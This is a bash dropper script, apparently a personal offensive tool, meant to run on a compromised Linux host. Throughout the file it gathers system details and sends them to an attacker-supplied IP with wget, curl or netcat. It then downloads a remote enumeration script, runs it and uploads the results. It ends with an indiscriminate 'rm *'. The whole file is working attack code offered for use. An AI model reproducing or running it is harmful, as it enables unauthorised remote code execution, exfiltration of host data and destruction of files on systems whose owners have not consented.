#!/bin/bash

# drop.sh
# download & execute an enumeration script and send log back for parsing, bourne again shell
# written by mrush 10.2016
# m@root.dance
# https://github.com/nomasters

##############
# variables
##############

w=1
r=`date |od |md5sum |cut -b-8`
o=$1				# origin: attacker ip address
u="`uname -a`"			# push back the full uname kernel banner
b="`file /bin/ls`"
sh="`grep '^/bin/sh$' /etc/shells`"
t=`/sbin/ifconfig |head -n2 |tac |head -n1 |sed -e "s/^ *//" |cut -d " " -f2`
i=`(echo $t |grep ":" 2>&1 >/dev/null) && echo $t |cut -d : -f2 || echo $t`
co="`for comp in xz bzip2 gzip zip shar; do which $comp && co=$comp && break; done`"

##############
# options
##############

[ -z "$1" ] && echo "[-] origin ip" && exit 1

##############
# flow control
##############

e_e () {
  echo [*] [running enum]
  chmod +x $r.sh
  ./$r.sh >$r.log
}

e_t () {
# find a suitable down/up-load tool
for tool in nc curl wget ncat; do
  which $tool && t=$tool && break
done
echo [+] [tool: $t]
[[ -z $t ]] && [-] echo no tool found. use egress mode && exit 1
}

echo "$i;$u;$b;$sh;$co" >$r.ban
stringBanner="[ ] [sending banner]"
stringRecvE="[ ] [receiving enum]"
stringSend="[ ] [sending log]"

e_w () {
  echo "$stringBanner"
  wget http://$o:9999/$r.ban -t1 --read-timeout=15 --post-file=$r.ban
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  echo "$stringRecvE"
    wget $o/e.sh -qO- > $r.sh
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  e_e
  echo "$stringSend"
    wget http://$o:9999/$r.log -t1 --read-timeout=15 --post-file=$r.log # && rm $r.* $0
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
}
e_c () {
  echo "$stringBanner"
  curl -s -m 15 http://$o:9999/ -T $r.ban
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  echo "$stringRecvE"
  curl -s http://$o/e.sh -o $r.sh
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  e_e
  echo "$stringSend"
  curl -s -m 30 http://$o:9999/ -T $r.log # && rm $r.* $0
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
}
e_n () {
  echo "$stringBanner"
  echo "PUT /$r.ban HTTP/1.1\r\n data=$(cat $r.ban)\r\n" |nc -w$w -nvvv $o 9999
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  echo "$stringRecvE"
  echo "GET /e.sh HTTP/1.1\r\n" |nc -w$w -nvv $o 80 > $r.sh
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
  e_e
  echo "$stringSend"
  echo "PUT /$r.log HTTP/1.1\r\n data=$(cat $r.log)\r\n" |nc -w$w -n $o 9999
  state=$?;[[ $state == 0 ]] && echo " [+]" || echo " [-] $state"
# && rm $r.* $0
}
e_N () {
  echo ncat not yet supported, add it.
}
# also, add support for bash4 or whatever version that can use "/dev/tcp/$o/$port".

clear
e_t
[[ $t == wget ]] && e_w
[[ $t == curl ]] && e_c
[[ $t == nc ]] && e_n
[[ $t == ncat ]] && e_N
rm *
